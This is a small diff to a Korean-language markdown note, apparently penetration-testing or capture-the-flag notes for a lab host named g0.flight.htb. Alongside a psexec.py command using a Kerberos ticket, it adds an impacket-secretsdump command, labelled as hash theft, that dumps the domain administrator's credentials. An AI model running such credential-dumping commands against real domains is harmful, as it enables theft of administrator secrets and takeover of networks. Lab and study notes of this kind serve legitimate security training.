@@ -777,6 +777,9 @@ export KRB5CCNAME=/path/to/ticket.ccache
 ```bash
 # KRB5CCNAME 사용하여 psexec 실행
 psexec.py -k -no-pass DOMAIN/USER@<FQDN>
+
+# 해시 탈취
+impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator
 ```
   
 </details>
